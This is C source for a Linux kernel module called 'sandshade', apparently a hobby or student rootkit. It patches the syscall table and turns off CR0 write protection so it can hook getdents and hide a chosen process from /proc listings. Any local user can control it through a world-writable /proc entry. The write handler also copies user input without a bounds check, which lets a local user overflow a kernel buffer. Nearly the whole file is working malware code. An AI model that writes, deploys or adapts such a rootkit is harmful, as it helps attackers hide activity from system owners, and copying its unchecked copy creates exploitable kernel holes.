#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <asm/syscall.h>
#include <linux/sched.h>
#include <linux/tty.h>
#include <asm/unistd_64.h>
#include <linux/kallsyms.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>

#include "getcmd.h"
#include "common.h"
#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Stefan Chu, Arseny Moguilevski");

static int disable(void)
{
    write_cr0(read_cr0() & (~0x10000));
    //xchg(&sys_call_table[329], og_print_group);
    syscall_table[__NR_getdents] = (unsigned long *) og_getdents;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

static int enable(void)
{
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents] = (unsigned long *) hook_getdents;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

/* Command Options Handler.
 * "enable"	- enables the hook
 * "disable"	- disables the hook
 * else		- the user enter the name of the process they wish to hide.
 *		  The command is sent to check() to verify the process name exists.
 *		  If it does, the pid for that process is returned and put into a
 *		  char buffer that the hooked getdents will look for when it compares
 *		  pid entries in the /proc directory. 
 */
static int arg_chk(const char *msg)
{
    if (strcmp(msg, "enable") == 0) {
	enable();
    }
    else if (strcmp(msg, "disable") == 0) {
	disable();
    }
    else {
	if((pid = check(msg)) == 0)
	    return -1;
	snprintf(hide_pid, 8, "%ld", pid);
    }
    return 0;
}

/* Write handler. 
 * Sends the <command> sent to it from userspace to arg_chk 
 */
ssize_t proc_write(struct file *sp_file, const char __user *buf, size_t size, loff_t *offset)
{
    len = size;
    copy_from_user(msg, buf, len);
    msg[len - 1] = '\0';
    if(arg_chk(msg) == -1) return -EINVAL;
    return len;
}

static struct file_operations fops = {
    .write = proc_write,
};

static int __init load(void) 
{
    syscall_table = (void *) kallsyms_lookup_name("sys_call_table");
    og_getdents = (void *) syscall_table[__NR_getdents];

    /* Create a /proc entry that we can echo commands to (our module). 
       EXAMPLE: # echo "enable" > /proc/sandshade 
       	    or: # echo "python -m SimpleHTTPServer" > /proc/sandshade 
       Was thinking about the beach. That's where the name sandshade came from. */
    proc_create("sandshade", 0666, NULL, &fops);
    printk("MODULE: loaded.\n");
    return 0;
}

static void __exit unload(void)
{
    /* disable the hook if it is enable and remove our /proc entry. */
    disable();
    remove_proc_entry("sandshade", NULL);
    printk("MODULE: unloaded.\n");
}

module_init(load);
module_exit(unload);
